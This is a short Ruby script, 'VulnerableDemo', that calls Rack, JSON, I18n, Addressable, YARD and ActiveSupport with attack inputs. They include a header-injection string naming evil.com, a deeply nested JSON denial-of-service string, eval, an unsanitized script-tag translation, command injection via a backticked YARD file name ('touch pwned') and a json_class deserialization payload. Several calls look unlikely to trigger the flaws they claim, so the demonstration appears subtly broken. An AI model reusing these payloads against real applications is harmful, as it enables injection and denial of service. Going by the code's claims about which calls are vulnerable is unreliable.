require 'rack'
require 'json'
require 'sinatra'
require 'i18n'
require 'addressable'
require 'yard'
require 'active_support'

class VulnerableDemo
  def demonstrate_vulnerabilities
    malicious_header = "X-Forwarded-Host: example.com\r\nX-Forwarded-Host: evil.com"
    env = { 'HTTP_X_FORWARDED_HOST' => malicious_header }
    request = Rack::Request.new(env)

    malicious_json = '{"a":' * 100000 + '1' + '}' * 100000
    JSON.parse(malicious_json)

    eval("puts 'Hello from eval'")

    I18n.locale = :en
    I18n.backend.store_translations(:en, :vulnerable => '<script>alert(1)</script>')
    I18n.t(:vulnerable, :sanitize => false)

    uri = Addressable::URI.parse("http://example.com/?foo=#{('a' * 100000)}...")

    YARD::CLI::Command.run("markup --type rdoc --file '`touch pwned`'")

    payload = '{"json_class":"ActiveSupport::TimeWithZone","attributes":["---\nfoo: bar\n"]}'
    ActiveSupport::JSON.decode(payload)
  end
end

demo = VulnerableDemo.new
demo.demonstrate_vulnerabilities 